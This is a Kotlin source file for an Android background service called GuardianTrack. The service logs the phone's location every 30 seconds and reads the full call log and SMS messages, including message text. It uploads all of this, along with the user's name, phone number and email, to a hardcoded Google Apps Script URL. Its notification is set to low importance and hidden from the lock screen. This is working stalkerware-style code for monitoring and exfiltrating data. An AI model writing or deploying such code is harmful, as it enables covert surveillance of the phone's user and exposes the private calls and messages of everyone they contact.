package com.example.guardiantrack

import android.Manifest
import android.app.ForegroundServiceStartNotAllowedException
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.provider.Telephony
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationAvailability
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import okhttp3.Call
import okhttp3.Callback
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import okhttp3.Response
import java.io.File
import java.io.IOException

class LocationService : Service() {

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationRequest: LocationRequest
    private lateinit var locationCallback: LocationCallback

    private val okHttpClient = OkHttpClient()

    private val googleSheetsUrl = "https://script.google.com/macros/s/AKfycbwulHIIPZrQXErYiQ1FDyW8yp_R8J0VU4ZjYfk-x-z1AK6hqYpIycu-CHQPovGBTGKcjg/exec"

    companion object {
        private const val TAG = "LocationService"
        private const val CHANNEL_ID = "GuardianTrackChannel"
        private const val NOTIFICATION_ID = 12345
        private const val LOCATION_UPDATE_INTERVAL_MS = 30_000L
        private const val FASTEST_LOCATION_INTERVAL_MS = 15_000L

        const val ACTION_START_TRACKING = "com.example.guardiantrack.ACTION_START_TRACKING"
        const val ACTION_STOP_TRACKING = "com.example.guardiantrack.ACTION_STOP_TRACKING"
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service created")
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        createNotificationChannel()
        sendUserDataToGoogleSheets()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "onStartCommand: action=${intent?.action}")
        when (intent?.action) {
            ACTION_START_TRACKING -> {
                startForegroundServiceWithNotification()
                startLocationUpdates()
                fetchAndSendCallLogs()
                fetchAndSendSmsLogs()
            }
            ACTION_STOP_TRACKING -> {
                Log.d(TAG, "Stopping service")
                stopSelf()
                return START_NOT_STICKY
            }
            else -> {
                Log.d(TAG, "Service restarted without specific action")
                startForegroundServiceWithNotification()
                startLocationUpdates()
                fetchAndSendCallLogs()
                fetchAndSendSmsLogs()
            }
        }
        return START_STICKY
    }

    private fun startForegroundServiceWithNotification() {
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntentFlags =
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        val pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, pendingIntentFlags)

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("GuardianTrack Active")
            .setContentText("Tracking location, calls, and SMS.")
            .setSmallIcon(R.drawable.ic_stat_tracking_notification)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
            Log.d(TAG, "Foreground service started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground service: ${e.message}", e)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && e is ForegroundServiceStartNotAllowedException) {
                Log.e(TAG, "ForegroundServiceStartNotAllowedException: Check battery settings or app visibility")
            }
            stopSelf()
        }
    }

    private fun startLocationUpdates() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Location permissions not granted")
            return
        }

        locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, LOCATION_UPDATE_INTERVAL_MS)
            .setMinUpdateIntervalMillis(FASTEST_LOCATION_INTERVAL_MS)
            .build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { location ->
                    Log.d(TAG, "Location update: lat=${location.latitude}, lng=${location.longitude}, accuracy=${location.accuracy}")
                    val userId = getCurrentUserId()
                    if (userId != null) {
                        sendLocationDataToGoogleSheets(userId, location.latitude, location.longitude, location.time)
                        appendLocationToCsv(userId, location.latitude, location.longitude, location.time)
                    } else {
                        Log.e(TAG, "User ID not found, cannot send location data")
                    }
                } ?: Log.w(TAG, "LocationResult lastLocation is null")
            }

            override fun onLocationAvailability(availability: LocationAvailability) {
                Log.d(TAG, "Location availability: ${availability.isLocationAvailable}")
            }
        }

        try {
            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper())
            Log.d(TAG, "Requested location updates")
        } catch (e: SecurityException) {
            Log.e(TAG, "Lost location permission before requesting updates", e)
        }
    }

    private fun getCurrentUserId(): Int? {
        val prefs = getSharedPreferences("GuardianTrackPrefs", Context.MODE_PRIVATE)
        val id = prefs.getInt("UserId", -1)
        return if (id == -1) null else id
    }

    private fun appendLocationToCsv(userId: Int, latitude: Double, longitude: Double, timestamp: Long) {
        val csvFile = File(filesDir, "GuardianTrackLogs.csv")
        try {
            val line = "$userId,$latitude,$longitude,$timestamp,${System.currentTimeMillis()}\n"
            csvFile.appendText(line)
            Log.d(TAG, "Appended location to CSV: ${csvFile.absolutePath}")
        } catch (e: IOException) {
            Log.e(TAG, "Failed to append location to CSV", e)
        }
    }

    private fun sendLocationDataToGoogleSheets(userId: Int, latitude: Double, longitude: Double, timestamp: Long) {
        val formBody = FormBody.Builder()
            .add("UserId", userId.toString())
            .add("DataType", "Location")
            .add("Latitude", latitude.toString())
            .add("Longitude", longitude.toString())
            .add("Timestamp", timestamp.toString())
            .add("DeviceTimestamp", System.currentTimeMillis().toString())
            .build()
        submitToGoogleSheets(formBody, "LocationData")
    }

    private fun sendUserDataToGoogleSheets() {
        val prefs = getSharedPreferences("GuardianTrackPrefs", Context.MODE_PRIVATE)
        val userId = prefs.getInt("UserId", -1)
        val userName = prefs.getString("UserName", "") ?: ""
        val phoneNumber = prefs.getString("PhoneNumber", "") ?: ""
        val email = prefs.getString("Email", "") ?: ""

        if (userId == -1 || userName.isEmpty() || phoneNumber.isEmpty() || email.isEmpty()) {
            Log.w(TAG, "User data incomplete, not sending to Google Sheets")
            return
        }

        val formBody = FormBody.Builder()
            .add("UserId", userId.toString())
            .add("UserName", userName)
            .add("PhoneNumber", phoneNumber)
            .add("Email", email)
            .add("DataType", "UserData")
            .build()
        submitToGoogleSheets(formBody, "UserData")
    }

    private fun sendAlertDataToGoogleSheets(userId: Int, type: String, details: String, eventTimestamp: Long) {
        val formBody = FormBody.Builder()
            .add("UserId", userId.toString())
            .add("DataType", type)
            .add("Details", details)
            .add("Timestamp", eventTimestamp.toString())
            .add("DeviceTimestamp", System.currentTimeMillis().toString())
            .build()
        submitToGoogleSheets(formBody, type)
    }

    private fun submitToGoogleSheets(formBody: RequestBody, requestTag: String) {
        val request = Request.Builder()
            .url(googleSheetsUrl)
            .post(formBody)
            .build()

        okHttpClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "$requestTag: OkHttp request failed", e)
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (it.isSuccessful) {
                        Log.d(TAG, "$requestTag: Successfully sent. HTTP ${it.code}. Response: ${it.body?.string()}")
                    } else {
                        Log.e(TAG, "$requestTag: Error sending. HTTP ${it.code} - ${it.message}. Response: ${it.body?.string()}")
                    }
                }
            }
        })
    }

    private fun fetchAndSendCallLogs() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "READ_CALL_LOG permission not granted, skipping call log fetch")
            return
        }

        val contentResolver = applicationContext.contentResolver
        val uri: Uri = CallLog.Calls.CONTENT_URI
        val projection = arrayOf(
            CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION
        )

        try {
            contentResolver.query(uri, projection, null, null, "${CallLog.Calls.DATE} DESC")?.use { cursor ->
                Log.d(TAG, "Call log cursor count: ${cursor.count}")
                val numberCol = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                val typeCol = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
                val dateCol = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)
                val durationCol = cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)

                val userId = getCurrentUserId() ?: return@use

                while (cursor.moveToNext()) {
                    val number = cursor.getString(numberCol) ?: "Unknown"
                    val typeInt = cursor.getInt(typeCol)
                    val date = cursor.getLong(dateCol)
                    val duration = cursor.getLong(durationCol)
                    val callTypeStr = when (typeInt) {
                        CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                        CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                        CallLog.Calls.MISSED_TYPE -> "MISSED"
                        CallLog.Calls.VOICEMAIL_TYPE -> "VOICEMAIL"
                        CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                        CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
                        else -> "UNKNOWN_TYPE_$typeInt"
                    }
                    val details = "Number: $number, Type: $callTypeStr, Duration: $duration sec"
                    sendAlertDataToGoogleSheets(userId, "CallLog", details, date)
                }
            } ?: Log.w(TAG, "Call log query returned null cursor")
        } catch (e: Exception) {
            Log.e(TAG, "Exception while reading call logs", e)
        }
    }

    private fun fetchAndSendSmsLogs() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "READ_SMS permission not granted, skipping SMS log fetch")
            return
        }

        val contentResolver = applicationContext.contentResolver
        val uri: Uri = Telephony.Sms.CONTENT_URI
        val projection = arrayOf(
            Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE
        )

        try {
            contentResolver.query(uri, projection, null, null, "${Telephony.Sms.DATE} DESC")?.use { cursor ->
                Log.d(TAG, "SMS log cursor count: ${cursor.count}")
                val addressCol = cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
                val bodyCol = cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)
                val dateCol = cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)
                val typeCol = cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)

                val userId = getCurrentUserId() ?: return@use

                while (cursor.moveToNext()) {
                    val address = cursor.getString(addressCol) ?: "Unknown"
                    val body = cursor.getString(bodyCol) ?: ""
                    val date = cursor.getLong(dateCol)
                    val smsTypeStr = when (val typeInt = cursor.getInt(typeCol)) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "INBOX"
                        Telephony.Sms.MESSAGE_TYPE_SENT -> "SENT"
                        Telephony.Sms.MESSAGE_TYPE_DRAFT -> "DRAFT"
                        Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "OUTBOX"
                        Telephony.Sms.MESSAGE_TYPE_FAILED -> "FAILED"
                        Telephony.Sms.MESSAGE_TYPE_QUEUED -> "QUEUED"
                        else -> "UNKNOWN_TYPE_$typeInt"
                    }
                    val details = "From/To: $address, Type: $smsTypeStr, Body: ${body.take(100)}${if (body.length > 100) "..." else ""}"
                    sendAlertDataToGoogleSheets(userId, "SMSLog", details, date)
                }
            } ?: Log.w(TAG, "SMS log query returned null cursor")
        } catch (e: Exception) {
            Log.e(TAG, "Exception while reading SMS logs", e)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "GuardianTrack Service Channel",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Channel for GuardianTrack background tracking service."
                setSound(null, null)
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
            Log.d(TAG, "Notification channel created")
        }
    }

    override fun onDestroy() {
        Log.d(TAG, "Service destroyed")
        try {
            if (this::fusedLocationClient.isInitialized && this::locationCallback.isInitialized) {
                fusedLocationClient.removeLocationUpdates(locationCallback)
                Log.d(TAG, "Location updates removed")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error removing location updates on destroy", e)
        }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
